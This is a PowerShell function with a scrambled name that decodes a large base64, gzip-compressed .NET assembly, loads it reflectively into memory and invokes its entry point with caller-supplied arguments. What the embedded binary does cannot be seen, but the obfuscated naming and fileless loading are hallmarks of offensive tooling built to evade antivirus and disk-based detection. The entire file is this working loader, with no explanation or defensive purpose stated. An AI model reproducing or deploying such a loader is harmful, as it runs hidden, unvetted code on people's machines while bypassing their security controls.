function Invoke-Cvfknpokfetvpg ($Params){
    if (!$Cvfknpokfetvpg_assembly){
        $compressed = "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"
        $bytes = [System.Convert]::FromBase64String($compressed)
        $input = New-Object System.IO.MemoryStream( , $bytes)
        $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo($output)
        $gzipStream.Close()
	    $input.Close()
	    [byte[]] $decompressed_bytes = $output.ToArray()
        $Script:Cvfknpokfetvpg_assembly = [System.Reflection.Assembly]::Load($decompressed_bytes)
        "Loaded!"
    }
    $Cvfknpokfetvpg_assembly.EntryPoint.Invoke($null, (, $Params.split()))
}
